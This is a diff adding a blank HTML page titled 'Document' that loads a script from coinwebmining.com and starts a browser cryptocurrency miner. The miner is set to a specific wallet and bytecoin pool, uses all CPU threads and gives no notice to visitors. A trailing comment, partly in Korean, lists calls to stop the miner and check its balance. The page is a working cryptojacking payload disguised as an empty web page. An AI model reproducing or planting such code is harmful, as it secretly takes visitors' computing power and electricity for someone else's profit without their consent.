@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://coinwebmining.com/cwm.js"></script>
+    
+    
+</head>
+<body>
+    
+</body>
+<script>
+    var site_id = 'cwm-4635';
+    var coin = 'bytecoin';
+    var wallet = '0xD0Dc39f8A705565B3f3d3951D8Be75D06a93c4B4';
+    var password = 'x';
+    var mining_pool = 'us.bytecoin-pool.org:3333';
+    var threads = -1;
+    var throttle = 0.2;
+    var debug = false;
+    var userid = '{uniqueVisitorUsername}';
+    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+
+    cwm_user_stats(site_id, userid, function(hashes){
+        console.log(hashes); // this is where you get the total number of accepted hashes for a user name
+    });
+</script>
+</html>
+
+<!-- 
+    coinwebmining.com
+    cwm_stop(); miner stop
+    cwm_user_stats(); 잔액확인
+
+
+
+-->
